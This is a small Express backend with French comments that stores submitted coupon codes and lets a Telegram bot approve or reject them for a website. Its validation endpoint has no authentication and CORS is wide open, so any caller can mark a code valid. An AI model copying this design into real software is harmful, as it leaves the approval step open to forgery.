// Backend Node.js/Express pour validation des coupons
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const app = express();
const port = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

// Stockage temporaire en mémoire (à remplacer par une base si besoin)
const codes = {};

// Endpoint pour enregistrer la demande de validation (depuis le site)
app.post('/api/request', (req, res) => {
  const { code, type, requestId } = req.body;
  if (!code || !type || !requestId) return res.status(400).json({ ok: false });
  codes[requestId] = { code, type, status: 'pending' };
  res.json({ ok: true });
});

// Endpoint pour le bot Telegram : valider/refuser un code
app.post('/api/validate', (req, res) => {
  const { requestId, result } = req.body;
  if (!codes[requestId]) return res.status(404).json({ ok: false });
  codes[requestId].status = result === 'OUI' ? 'valid' : 'invalid';
  res.json({ ok: true });
});

// Endpoint pour le site : vérifier le statut
app.get('/api/status/:requestId', (req, res) => {
  const { requestId } = req.params;
  if (!codes[requestId]) return res.json({ status: 'notfound' });
  res.json({ status: codes[requestId].status });
});

app.listen(port, () => {
  console.log('API listening on port', port);
});
